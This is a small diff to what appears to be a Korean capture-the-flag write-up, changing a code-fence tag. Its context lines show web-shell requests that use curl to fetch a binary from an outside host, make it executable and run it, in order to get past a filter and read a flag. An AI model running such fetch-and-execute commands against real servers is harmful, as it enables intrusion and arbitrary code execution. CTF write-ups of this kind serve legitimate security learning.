@@ -116,7 +116,7 @@ PHP 웹쉘 또는 `/flag`를 실행하여 pattern에 걸리지 않는 이름으�
 /flag > te.ttt
 ```
 
-```http
+```
 1. GET /test.php?cmd=curl ctf.heogi.com/heogi -o heogi
 2. GET /test.php?cmd=chmod 777 heogi
 3. GET /test.php?cmd=/var/www/html/heogi
